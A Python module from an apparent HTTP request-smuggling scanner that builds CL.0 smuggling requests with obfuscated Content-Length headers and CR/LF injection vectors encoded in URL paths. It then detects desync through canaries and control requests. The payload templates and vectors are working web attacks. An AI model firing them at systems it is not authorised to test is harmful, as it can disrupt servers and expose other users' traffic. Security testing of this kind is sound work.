"""Helpers for the desync module: HTTP desync checks written as exact bytes on raw sockets.

Two rules shape everything here:

1. The unit of observation is a connection, not a request. ``exchange`` writes every
   request before reading any answer, so a smuggled prefix is still in the server's buffer
   when the next request lands, and attributes the answers to the requests in order.
2. It records observations, not verdicts. Raw bytes are kept before any parse, and a parse
   failure with bytes present is a signal, not noise.

Sections: wire (exchange, the answer parser, the pacer) · smuggle (the CL.0 technique
family) · split (fold vectors and their matched controls) · oracles (stability gate,
analyses, redaction) · output (rows, lines, packing) · workflow side · payloads.
"""

from __future__ import annotations

import asyncio
import base64
import dataclasses
import functools
import gzip
import hashlib
import math
import re
import ssl
import time
import urllib.parse
import zlib
from collections.abc import Callable, Sequence
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta

import temporalio.converter
from temporalio import activity
from temporalio.api.common.v1 import Payload
from temporalio.converter import DataConverter, PayloadCodec
from temporalio.exceptions import ActivityError, ApplicationError, is_cancelled_exception

HEARTBEAT_EVERY_S = 10.0
MAX_OUTPUT_BYTES = 1_500_000  # Temporal rejects payloads over 2 MB

CHECKS = ("smuggle", "split")
CONCURRENCY = 8  # URLs probed at once in a chunk; the pacer still holds each host to rate_ms
REPEATS = 3  # baseline repeats for the stability gate
BUDGET_S = 600  # per URL
SWEEP_BUDGET_S = 3600  # per URL, with sweep
READ_TIMEOUT_S = 10.0  # connect, and reading every answer of one connection
GRACE_S = 0.5  # how long to keep reading after the expected answers, for bytes nobody asked for
MAX_READ_BYTES = 4_000_000
RAW_HEAD_BYTES = 4096
CANARY_SUFFIX = "-warden"


# --- wire ------------------------------------------------------------------------------------


@dataclass(frozen=True)
class Target:
    url: str
    scheme: str
    host: str
    port: int
    path: str  # the URL's path, percent-encoded, without query or fragment

    @property
    def authority(self) -> str:
        """The Host header: the port only when it is not the scheme's default."""
        default = 443 if self.scheme == "https" else 80
        return self.host if self.port == default else f"{self.host}:{self.port}"


def target_of(url: str) -> Target:
    parts = urllib.parse.urlsplit(url)
    scheme = parts.scheme.lower()
    if scheme not in ("http", "https") or not parts.hostname:
        raise ValueError(f"not an http(s) URL: {url}")
    port = parts.port or (443 if scheme == "https" else 80)
    path = urllib.parse.quote(parts.path or "/", safe="/%:@!$&'()*+,;=-._~")
    return Target(url, scheme, parts.hostname, port, path if path.startswith("/") else "/" + path)


@dataclass
class Answer:
    """One HTTP answer cut out of a connection's stream. ``raw`` is exactly what arrived for it."""

    status: int = 0
    headers: list[tuple[str, str]] = field(default_factory=list)
    head: bytes = b""
    body: bytes = b""
    raw: bytes = b""
    parse_error: str = ""
    end: int = 0  # offset in the stream where this answer ends
    ms: float = 0.0  # from the write until this answer's last byte arrived

    def header_names(self) -> set[str]:
        return {name.lower() for name, _ in self.headers}

    def digest(self) -> str:
        return "" if self.parse_error else hashlib.sha256(self.body).hexdigest()[:16]


@dataclass
class Conn:
    """What one connection carried: answers in request order, bytes after them, how it ended."""

    answers: list[Answer] = field(default_factory=list)
    trailing: bytes = b""
    raw: bytes = b""
    error: str = ""  # connect or TLS failure: nothing was sent
    read_error: str = ""
    closed_after: int = -1  # complete answers received when the peer closed; -1 if it did not
    timed_out: bool = False
    sent: int = 0  # requests written

    def answer(self, i: int) -> Answer | None:
        return self.answers[i] if i < len(self.answers) else None


STATUS_RE = re.compile(rb"^HTTP/\d(?:\.\d)? (\d{3})(?: |$)")


def parse_answers(buf: bytes, expected: int, eof: bool) -> tuple[list[Answer], bytes]:
    """Cut ``expected`` answers out of a stream (1xx interim answers skipped).

    Returns the answers and the bytes after them. An answer still arriving is left out
    unless ``eof``; then it is kept with ``parse_error="truncated"``. Bytes that are not an
    HTTP answer end the parse: they become one answer carrying the raw bytes and the error.
    """
    answers: list[Answer] = []
    i = 0
    while i < len(buf) and len(answers) < expected:
        got = _parse_one(buf, i, eof)
        if got is None:
            if eof:
                m = STATUS_RE.match(buf[i:].split(b"\n", 1)[0].rstrip(b"\r"))
                status = int(m[1]) if m else 0
                answers.append(Answer(status=status, raw=buf[i:], parse_error="truncated", end=len(buf)))
                i = len(buf)
            break
        if isinstance(got, str):
            answers.append(Answer(raw=buf[i:], parse_error=got, end=len(buf)))
            i = len(buf)
            break
        if 100 <= got.status < 200 and got.status != 101:
            i = got.end
            continue
        answers.append(got)
        i = got.end
    trailing = buf[i:] if len(answers) >= expected else b""
    return answers, trailing


def _parse_one(buf: bytes, i: int, eof: bool) -> Answer | str | None:
    """The answer starting at ``i``; None when incomplete; an error message when it is not one."""
    end, sep = buf.find(b"\r\n\r\n", i), 4
    lf = buf.find(b"\n\n", i)
    if lf >= 0 and (end < 0 or lf < end):
        end, sep = lf, 2
    if end < 0:
        if len(buf) - i >= 5 and not buf.startswith(b"HTTP/", i):
            return "not an HTTP answer"
        return None
    lines = buf[i:end].split(b"\n")
    m = STATUS_RE.match(lines[0].rstrip(b"\r"))
    if not m:
        return "bad status line"
    status, headers = int(m[1]), []
    for line in lines[1:]:
        name, colon, value = line.rstrip(b"\r").partition(b":")
        if not colon or not name.strip():
            return "bad header line"
        headers.append((name.decode("latin-1").strip(), value.decode("latin-1").strip()))
    start = end + sep
    fields = {k.lower(): v for k, v in headers}

    def done(body: bytes, stop: int) -> Answer:
        return Answer(status, headers, buf[i:start], bytes(body), buf[i:stop], end=stop)

    if 100 <= status < 200 or status in (204, 304):
        return done(b"", start)
    if "chunked" in fields.get("transfer-encoding", "").lower():
        body, j = bytearray(), start
        while True:
            k = buf.find(b"\r\n", j)
            if k < 0:
                return None
            try:
                size = int(buf[j:k].split(b";")[0].strip(), 16)
            except ValueError:
                return "bad chunk size"
            j = k + 2
            if size == 0:
                t = buf.find(b"\r\n\r\n", j - 2)  # the last chunk's CRLF, then trailers, then a blank line
                return None if t < 0 else done(body, t + 4)
            if len(buf) < j + size + 2:
                return None
            body += buf[j : j + size]
            j += size + 2
    if "content-length" in fields:
        try:
            n = int(fields["content-length"])
        except ValueError:
            return "bad content-length"
        if n < 0:
            return "bad content-length"
        return None if len(buf) < start + n else done(buf[start : start + n], start + n)
    return done(buf[start:], len(buf)) if eof else None


@functools.cache
def tls_context() -> ssl.SSLContext:
    """TLS that offers only http/1.1 (h1 bytes on an h2 connection test nothing) and verifies nothing."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])
    return ctx


async def exchange(t: Target, requests: Sequence[bytes], timeout: float | None = None) -> Conn:
    """Open one connection, write every request byte for byte, then read their answers.

    Reading stops ``GRACE_S`` after the expected answers are in (or the stream stopped
    parsing), when the peer closes, or ``timeout`` after the write. Cancellation closes the
    connection.
    """
    timeout = READ_TIMEOUT_S if timeout is None else timeout
    conn = Conn()
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(t.host, t.port, ssl=tls_context() if t.scheme == "https" else None),
            timeout,
        )
    except ssl.SSLError as e:
        conn.error = f"tls: {e}"
        return conn
    except OSError as e:  # refused, unreachable, DNS, timeout (TimeoutError is an OSError)
        conn.error = f"connect: {e or type(e).__name__}"
        return conn

    started = time.monotonic()
    buf, arrivals, eof = bytearray(), [], False
    try:
        try:
            writer.write(b"".join(requests))
            await writer.drain()
            conn.sent = len(requests)
        except OSError as e:
            conn.read_error = f"write: {e}"
        deadline, grace_until = started + timeout, None
        while True:
            if grace_until is None:
                answers, _ = parse_answers(bytes(buf), len(requests), eof=False)
                if len(answers) >= len(requests) or any(a.parse_error for a in answers):
                    grace_until = time.monotonic() + GRACE_S
            remaining = (deadline if grace_until is None else grace_until) - time.monotonic()
            if remaining <= 0:
                conn.timed_out = grace_until is None
                break
            try:
                chunk = await asyncio.wait_for(reader.read(65536), remaining)
            except TimeoutError:
                conn.timed_out = grace_until is None
                break
            except OSError as e:  # reset, TLS close without notify, ...
                conn.read_error, eof = str(e) or type(e).__name__, True
                break
            if not chunk:
                eof = True
                break
            buf += chunk
            arrivals.append((len(buf), time.monotonic() - started))
            if len(buf) >= MAX_READ_BYTES:
                break
    finally:
        writer.close()

    conn.raw = bytes(buf)
    conn.answers, conn.trailing = parse_answers(conn.raw, len(requests), eof=True)
    if eof:
        conn.closed_after = sum(1 for a in conn.answers if not a.parse_error)
    for a in conn.answers:
        a.ms = next((round(at * 1000, 1) for n, at in arrivals if n >= a.end), 0.0)
    return conn


class Pacer:
    """At most one new connection per host every ``rate_s``, shared by every URL of a chunk."""

    def __init__(self, rate_s: float) -> None:
        self.rate_s = rate_s
        self._next: dict[str, float] = {}
        self._locks: dict[str, asyncio.Lock] = {}

    async def wait(self, host: str) -> None:
        async with self._locks.setdefault(host, asyncio.Lock()):
            delay = self._next.get(host, 0.0) - time.monotonic()
            if delay > 0:
                await asyncio.sleep(delay)
            self._next[host] = time.monotonic() + self.rate_s


# --- smuggle: the CL.0 family ---------------------------------------------------------------
#
# One idea, found by hand in nine paid reports: make the front end fail to see Content-Length,
# so it forwards a body the back end reads as the start of the next request. The body is an
# INCOMPLETE request (no blank line, no host): if a back end leaves it in the socket, it
# prefixes the next request, which then asks for /<random>-warden. Detection only.

SMUGGLE_TEMPLATE = (
    "POST ${endpoint}?cb=${random} HTTP/1.1\r\n"
    "Host: ${host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Connection: keep-alive\r\n"
    "{HEADER}\r\n"
    "\r\n"
    "GET /${random}" + CANARY_SUFFIX + " HTTP/1.1\r\n"
    "X: X"
)
CL_NAME = "Content-Length"

# Where the hole goes in the header line: (id, render(name, hole, value)).
POSITIONS: tuple[tuple[str, Callable[[str, str, str], str]], ...] = (
    ("before-name", lambda n, h, v: h + n + ": " + v),  # \tContent-Length: 101
    ("in-name", lambda n, h, v: n[:8] + h + n[8:] + ": " + v),  # Content-|Length
    ("after-name", lambda n, h, v: n + h + ": " + v),  # Content-Length : 31
    ("around-colon", lambda n, h, v: n + h + ":" + h + v),  # Content-Length\t:\t31
    ("before-value", lambda n, h, v: n + ": " + h + v),  # Content-Length: +31
    ("after-value", lambda n, h, v: n + ": " + v + h),
    ("obs-fold", lambda n, h, v: n + h + "\r\n : " + v),  # Content-Length \r\n : 31
)
# Control bytes, 0x7F-0xFF and the printable oddities of real findings. Never 0x00: a NUL is
# more likely to be cut short on our side than forwarded, which would test us, not the target.
HOSTILE = [chr(b) for b in range(0x01, 0x21)] + [chr(b) for b in range(0x7F, 0x100)] + list("+-.,;\"'()*/\\")
CASINGS = ("preserve", "lower", "upper")
# (report, the line as reported, its Content-Length value)
SEEDS = (
    ("h1:2357178", "\tContent-Length: 101", "101"),
    ("h1:2358526", "\tContent-Length: 35", "35"),
    ("h1:2431300", "Content-Length\t:\t31", "31"),
    ("h1:2356849", "Content-Length \r\n : 31", "31"),
    ("h1:2444112", "Content-Length: +31", "31"),
    ("h1:2456548", "Content-Length: +31", "31"),
    ("h1:2509057", "Content-Length: +30", "30"),
    ("h1:2509198", "Content-Length: +30", "30"),
    ("h1:2413017", "content-length: +29", "29"),
)


@dataclass(frozen=True)
class Technique:
    variant: str  # <position>-<hole hex>-<casing>
    line: str  # the obfuscated header line, ${cl} unbound
    control_line: str  # the same header, well formed
    tier: int  # 1: reproduces a paid report
    provenance: str  # the reports it reproduces, or family:cl-obfuscation

    @property
    def text(self) -> str:
        return SMUGGLE_TEMPLATE.replace("{HEADER}", self.line, 1)

    @property
    def control_text(self) -> str:
        """The attack minus its gadget: same body, same canary, a correct well-formed length."""
        return SMUGGLE_TEMPLATE.replace("{HEADER}", self.control_line, 1)


def _cased(name: str, casing: str) -> str:
    return {"lower": name.lower(), "upper": name.upper()}.get(casing, name)


@functools.cache
def smuggle_family() -> tuple[Technique, ...]:
    """Every member, seeds first. Identity is the rendered template: first spelling wins."""
    seen: set[str] = set()
    out = []
    for casing in CASINGS:
        name = _cased(CL_NAME, casing)
        for pos, render_line in POSITIONS:
            for hole in HOSTILE:
                line = render_line(name, hole, "${cl}")
                control = f"{name}: ${{cl}}"
                text = SMUGGLE_TEMPLATE.replace("{HEADER}", line, 1)
                if line == control or text in seen:
                    continue
                seen.add(text)
                reports = [r for r, seed, cl in SEEDS if line.replace("${cl}", cl, 1) == seed]
                out.append(
                    Technique(
                        variant=f"{pos}-{hole.encode('latin-1').hex()}-{casing}",
                        line=line,
                        control_line=control,
                        tier=1 if reports else 2,
                        provenance=",".join(reports) or "family:cl-obfuscation",
                    )
                )
    return tuple(sorted(out, key=lambda t: (t.tier, t.variant)))


def smuggle_techniques(sweep: bool) -> tuple[Technique, ...]:
    family = smuggle_family()
    return family if sweep else tuple(t for t in family if t.tier == 1)


SLOT_RE = re.compile(r"\$\{([a-z_]+)\}")


def render(text: str, **slots: str) -> bytes:
    """Substitute every ``${slot}``; an unbound one is an error, never a literal on the wire."""

    def sub(m: re.Match[str]) -> str:
        if m[1] not in slots:
            raise ValueError(f"unbound slot {m[1]}")
        return slots[m[1]]

    return SLOT_RE.sub(sub, text).encode("latin-1")


def body_len(raw: bytes) -> int:
    i = raw.find(b"\r\n\r\n")
    return 0 if i < 0 else len(raw) - (i + 4)


def render_auto_cl(text: str, *, host: str, endpoint: str, random: str) -> bytes:
    """Render with ${cl} bound to the body's real length: for CL.0 the number is correct, and
    the attack is that the obfuscated LINE hides it from one of the two parsers."""
    first = render(text, host=host, endpoint=endpoint, random=random, cl="0")
    return render(text, host=host, endpoint=endpoint, random=random, cl=str(body_len(first)))


def benign_request(t: Target, random: str) -> bytes:
    return (
        f"GET {t.path}?cb={random} HTTP/1.1\r\nHost: {t.authority}\r\nConnection: keep-alive\r\n\r\n".encode()
    )


# --- split: fold vectors --------------------------------------------------------------------
#
# Every confirmed bypass of one report chain obeys one rule: a codepoint whose LOW BYTE is
# 0x0A (or 0x0D) survives a lossy narrowing in the back end. Percent-encoded in the path,
# %DC%8A (U+070A) is an ordinary character to the proxy and a line feed to a back end that
# decodes the path and keeps each character's low byte. Each vector's control is the same
# construction one value higher (%DC%8B), so length and shape hold and only the newline varies.

FOLD_CLASSES = {"lf": 0x0A, "cr": 0x0D}
KNOWN = {
    0x000A: "raw LF - H1 #1893764",
    0x000D: "raw CR",
    0x010A: "U+010A - Frans Rosen / H1 #2704607",
    0x010D: "U+010D - PortSwigger flamer docs (folds to CR)",
    0x070A: "U+070A Syriac - newest bypass, unreported",
    0x0B0A: "U+0B0A Oriya - H1 #3340283",
    0x560A: "U+560A - H1 #2095676",
    0x1F60A: "U+1F60A - H1 #3340283 (astral, same rule)",
}


@dataclass(frozen=True)
class Vector:
    id: str
    family: str  # raw | overlong | double-encoded | utf8-fold
    cls: str  # lf | cr
    codepoint: str
    encoded: str
    control: str
    tier: int
    known: bool
    note: str = ""


def pct(b: bytes) -> str:
    return "".join(f"%{c:02X}" for c in b)


def enc_overlong(n: int, v: int) -> str:
    lo, hi = 0x80 | (v & 0x3F), v >> 6
    return pct(
        {2: bytes([0xC0 | hi, lo]), 3: bytes([0xE0, 0x80 | hi, lo])}.get(
            n, bytes([0xF0, 0x80, 0x80 | hi, lo])
        )
    )


def enc_double(form: int, v: int) -> str:
    """Forms that become the control byte only after a second decode pass."""
    hi, lo = f"{v:02X}"
    if form == 1:
        return f"%25{hi}{lo}"  # %250A -> %0A -> LF
    if form == 2:
        return "%25" + pct(f"{hi}{lo}".encode())  # %25%30%41
    return "%" + pct(f"{hi}{lo}".encode())  # %%30%41


def _tier_of(cp: int) -> int:
    return 1 if cp < 0x800 else 2 if cp < 0x10000 else 3


@functools.cache
def fold_vectors(tier: int) -> tuple[Vector, ...]:
    """Every vector at or below ``tier``, deduplicated: tier, then published first, then id."""
    out: dict[str, Vector] = {}

    def add(v: Vector) -> None:
        out.setdefault(v.encoded, v)

    for cls, b in FOLD_CLASSES.items():
        cp0 = f"U+{b:04X}"
        add(Vector(f"raw-{cls}", "raw", cls, cp0, pct(bytes([b])), pct(bytes([b + 1])), 1, True, KNOWN[b]))
        for n in (2, 3, 4):
            add(
                Vector(
                    f"overlong{n}-{cls}",
                    "overlong",
                    cls,
                    cp0,
                    enc_overlong(n, b),
                    enc_overlong(n, b + 1),
                    1,
                    False,
                    f"{n}-byte overlong form",
                )
            )
        for form in (1, 2, 3):
            add(
                Vector(
                    f"double{form}-{cls}",
                    "double-encoded",
                    cls,
                    cp0,
                    enc_double(form, b),
                    enc_double(form, b + 1),
                    1,
                    False,
                    "requires two decode passes",
                )
            )
        for off in range(0x100, 0x110000, 0x100):
            cp = b + off
            if 0xD800 <= cp <= 0xDFFF:
                continue  # a surrogate is not a codepoint
            known = cp in KNOWN
            t = 1 if known else _tier_of(cp)  # a published fold belongs in the cheapest sweep
            if t > tier:
                continue
            add(
                Vector(
                    f"fold-{cls}-u{cp:04x}",
                    "utf8-fold",
                    cls,
                    f"U+{cp:04X}",
                    pct(chr(cp).encode()),
                    pct(chr(cp + 1).encode()),
                    t,
                    known,
                    KNOWN.get(cp, ""),
                )
            )
    return tuple(sorted(out.values(), key=lambda v: (v.tier, not v.known, v.id)))


def screen_vectors(vectors: Sequence[Vector]) -> list[Vector]:
    """Per class: the raw encoding and the first published fold (the first fold if none is)."""
    out = []
    for cls in FOLD_CLASSES:
        raw = next((v for v in vectors if v.cls == cls and v.family == "raw"), None)
        folds = [v for v in vectors if v.cls == cls and v.family == "utf8-fold"]
        fold = next((v for v in folds if v.known), folds[0] if folds else None)
        out += [v for v in (raw, fold) if v is not None]
    return out


def split_request(t: Target, encoded: str, canary: str) -> bytes:
    return (
        f"GET {t.path}{encoded}Host:{canary}{encoded} HTTP/1.1\r\n"
        f"Host: {t.authority}\r\nConnection: close\r\n\r\n"
    ).encode()


# --- oracles ---------------------------------------------------------------------------------


@dataclass
class Baseline:
    stable: bool
    status: int
    digest: str
    statuses: list[int]
    requests: int
    reason: str = ""  # why the URL is skipped


def baseline_of(conns: Sequence[Conn]) -> Baseline:
    """The stability gate: every repeat answered, same status, same body digest."""
    firsts = [c.answer(0) for c in conns]
    statuses = [a.status if a and not a.parse_error else 0 for a in firsts]
    digests = [a.digest() if a else "" for a in firsts]
    requests = sum(c.sent for c in conns)
    if not any(statuses):
        err = next((c.error or c.read_error for c in conns if c.error or c.read_error), "")
        return Baseline(False, 0, "", statuses, requests, f"unreachable: {err or 'no answer'}")
    if len(set(statuses)) > 1 or 0 in statuses:
        return Baseline(False, 0, "", statuses, requests, "erratic: statuses " + ",".join(map(str, statuses)))
    if len(set(digests)) > 1:
        return Baseline(
            False, statuses[0], "", statuses, requests, f"erratic: status {statuses[0]}, bodies differ"
        )
    return Baseline(True, statuses[0], digests[0], statuses, requests)


# Signals that count. post_status_changed narrows post_differs; closed_after_attack only
# counts alongside another one.
SMUGGLE_SIGNALS = ("post_differs", "post_parse_error", "post_timeout", "dual_response", "canary_reflected")


def analyze_smuggle(conn: Conn, base: Baseline, canary: str) -> tuple[list[str], str]:
    """The signals of one pipelined [benign, attack, benign] connection, and why it is void."""
    if conn.error:
        return [], conn.error
    pre, attack, post = conn.answer(0), conn.answer(1), conn.answer(2)
    if pre is None or pre.parse_error or pre.status != base.status or pre.digest() != base.digest:
        return [], "pre-flight benign request did not match the baseline"
    signals = []
    if post is not None:
        if post.parse_error:
            signals.append("post_parse_error")
        elif post.status != base.status:
            signals += ["post_differs", "post_status_changed"]
        elif post.digest() != base.digest:
            signals.append("post_differs")
    elif not (attack is not None and attack.status >= 400):
        signals.append("post_timeout")  # the attack was not rejected, and the next request got nothing
    if conn.trailing:
        signals.append("dual_response")
    if canary.encode() in conn.raw:
        signals.append("canary_reflected")
    if signals and conn.closed_after == 2:
        signals.append("closed_after_attack")
    return signals, ""


def counts(signals: Sequence[str]) -> bool:
    return any(s in SMUGGLE_SIGNALS for s in signals)


def control_fired(ctl: Conn, base: Baseline, canary: str) -> bool | None:
    """Whether the gadget-free control reproduced the effect; None when it could not run."""
    if ctl.error:
        return None
    if canary.encode() in ctl.raw or ctl.trailing:
        return True
    post = ctl.answer(2)
    return post is not None and (post.status != base.status or post.digest() != base.digest)


def payload_forms(v: Vector) -> list[bytes]:
    """Every representation of a vector and its control a page might reflect, longest first."""
    forms: set[bytes] = set()
    for enc in (v.encoded, v.control):
        forms |= {enc.encode(), enc.lower().encode(), enc.upper().encode()}
        once = urllib.parse.unquote_to_bytes(enc)
        forms |= {once, once.lower()}
        try:
            text = once.decode("utf-8")
        except UnicodeDecodeError:
            continue
        esc = "".join(
            f"\\u{0xD800 + ((ord(c) - 0x10000) >> 10):04x}\\u{0xDC00 + ((ord(c) - 0x10000) & 0x3FF):04x}"
            if ord(c) > 0xFFFF
            else f"\\u{ord(c):04x}"
            for c in text
        )
        forms |= {esc.encode(), esc.upper().replace("\\U", "\\u").encode()}
    return sorted((f for f in forms if f), key=len, reverse=True)


def redact(body: bytes, v: Vector) -> bytes:
    """Remove from a body every form of what both arms injected, and the folded byte and its
    neighbour. Applied to BOTH arms and to the body only: header line endings stay intact."""
    out = body
    for form in payload_forms(v):
        out = out.replace(form, b"<V>")
    folded = FOLD_CLASSES[v.cls]
    return out.replace(bytes([folded]), b"<V>").replace(bytes([folded + 1]), b"<V>")


def _canary_places(conn: Conn, canary: bytes) -> set[str]:
    places = set()
    if b"://" + canary in conn.raw.lower():
        places.add("authority")
    a = conn.answer(0)
    head, body = (a.head.lower(), a.body.lower()) if a and not a.parse_error else (b"", conn.raw.lower())
    if canary in head:
        places.add("header")
    if canary in body or canary in conn.trailing.lower():
        places.add("body")
    return places


def analyze_split(fold: Conn, ctl: Conn, v: Vector, canary: str) -> tuple[list[str], str, str]:
    """Fold arm against control arm: (signals, where the canary was reflected, void reason)."""
    if fold.error or ctl.error:
        return [], "", fold.error or ctl.error
    fa, ca = fold.answer(0), ctl.answer(0)
    if ca is None:
        return [], "", "the control arm got no answer"
    fold_places = _canary_places(fold, canary.lower().encode())
    ctl_places = _canary_places(ctl, canary.lower().encode())
    where = next((p for p in ("authority", "header", "body") if p in fold_places - ctl_places), "")
    signals = [f"canary_reflected:{where}"] if where else []
    if fa is None:
        return [*signals, "fold_no_answer"], where, ""
    if fa.status and ca.status and fa.status != ca.status:
        signals.append(f"status_differs:{ca.status}->{fa.status}")
    if redact(fa.body, v) != redact(ca.body, v):
        signals.append("body_differs")
    if new := sorted(fa.header_names() - ca.header_names()):
        signals.append("new_headers:" + "+".join(new))
    if fa.parse_error:
        signals.append(f"parse_error:{fa.parse_error}")
    if fold.trailing:
        signals.append("dual_response")
    return signals, where, ""


def split_lead(v: Vector, signals: Sequence[str], where: str) -> bool:
    """A reflected canary is a lead whatever the vector; any other signal only off the raw family,
    whose reactions (a 400 for %0A) are what every server that checks for a bare LF does."""
    return bool(where) or (v.family != "raw" and bool(signals))


# --- output ----------------------------------------------------------------------------------


def now() -> str:
    return datetime.now(UTC).isoformat(timespec="milliseconds")


def printable(s: str | bytes, limit: int = 0) -> str:
    """One line of text with control and non-ASCII bytes escaped (\\t, \\r, \\n, \\xNN)."""
    text = s.decode("latin-1") if isinstance(s, bytes) else s
    out = []
    for ch in text:
        o = ord(ch)
        out.append(
            {"\t": "\\t", "\r": "\\r", "\n": "\\n", "\\": "\\\\"}.get(ch)
            or (ch if 0x20 <= o < 0x7F else f"\\x{o:02x}" if o < 0x100 else f"\\u{o:04x}")
        )
    joined = "".join(out)
    return joined[:limit] + "..." if limit and len(joined) > limit else joined


def summary(a: Answer | None) -> dict | None:
    if a is None:
        return None
    d = {"status": a.status, "bytes": len(a.raw), "body_len": len(a.body), "digest": a.digest(), "ms": a.ms}
    if a.parse_error:
        d["parse_error"] = a.parse_error
    return d


def raw_head(conn: Conn) -> str:
    """The first RAW_HEAD_BYTES of a connection's stream, one char per byte (latin-1)."""
    return conn.raw[:RAW_HEAD_BYTES].decode("latin-1")


def lead_line(url: str, check: str, name: str, detail: str, signals: Sequence[str]) -> str:
    return f"{url} [{check}] [{name}] [{detail}] [{','.join(signals)}]"


def pack(files: dict[str, list[str]]) -> dict[str, str]:
    """Files for Warden: name -> base64 of the gzipped lines, empty files left out."""
    packed = {
        name: base64.b64encode(gzip.compress("".join(f"{line}\n" for line in lines).encode())).decode()
        for name, lines in files.items()
        if lines
    }
    size = sum(map(len, packed.values()))
    if size > MAX_OUTPUT_BYTES:
        raise ApplicationError(
            f"chunk output too large ({size} bytes compressed; Temporal payloads are limited to 2 MB): "
            "use a smaller chunk_size",
            type="OutputTooLarge",
            non_retryable=True,
        )
    return packed


async def heartbeats(details: Callable[[], dict]) -> None:
    """Heartbeat every HEARTBEAT_EVERY_S until cancelled: delivers cancellation, proves liveness."""
    while True:
        await asyncio.sleep(HEARTBEAT_EVERY_S)
        activity.heartbeat(details())


def chunk_label(run_id: str, index: int, total: int, targets: int) -> str:
    """How a chunk is named in the tab."""
    return f"{run_id} chunk {index}/{total} ({targets} URLs, attempt {activity.info().attempt})"


# --- workflow side ---------------------------------------------------------------------------


def host_key(url: str) -> tuple[str, int, str]:
    parts = urllib.parse.urlsplit(url)
    try:
        port = parts.port or (443 if parts.scheme.lower() == "https" else 80)
    except ValueError:
        port = 0
    return (parts.hostname or "", port, url)


def chunk_targets(urls: Sequence[str], size: int) -> list[list[str]]:
    """Deduplicated URLs ordered by host and port, so one host's URLs share a chunk (and a pacer)."""
    ordered = sorted(dict.fromkeys(urls), key=host_key)
    size = max(1, size)
    return [ordered[i : i + size] for i in range(0, len(ordered), size)]


def chunk_timeout(n: int, budget_s: int) -> timedelta:
    """Waves of CONCURRENCY URLs, each at most budget_s, plus ten minutes."""
    return timedelta(seconds=math.ceil(n / CONCURRENCY) * budget_s + 600)


def is_cancellation(exc: BaseException) -> bool:
    return isinstance(exc, asyncio.CancelledError) or (
        isinstance(exc, ActivityError) and is_cancelled_exception(exc)
    )


def error_message(exc: BaseException) -> str:
    cause: BaseException | None = exc
    while cause is not None:
        if isinstance(cause, ApplicationError):
            return cause.message
        cause = cause.__cause__
    return str(exc)


# --- payloads --------------------------------------------------------------------------------


class ZlibCodec(PayloadCodec):
    """zlib for every Temporal payload, the same codec as Warden's (src/warden/codec.py)."""

    async def encode(self, payloads: Sequence[Payload]) -> list[Payload]:
        return [
            Payload(metadata={"encoding": b"binary/zlib"}, data=zlib.compress(p.SerializeToString()))
            for p in payloads
        ]

    async def decode(self, payloads: Sequence[Payload]) -> list[Payload]:
        return [
            Payload.FromString(zlib.decompress(p.data)) if p.metadata.get("encoding") == b"binary/zlib" else p
            for p in payloads
        ]


def data_converter() -> DataConverter:
    """Temporal's default converter with zlib-compressed payloads (Warden uses the same)."""
    return dataclasses.replace(temporalio.converter.default(), payload_codec=ZlibCodec())
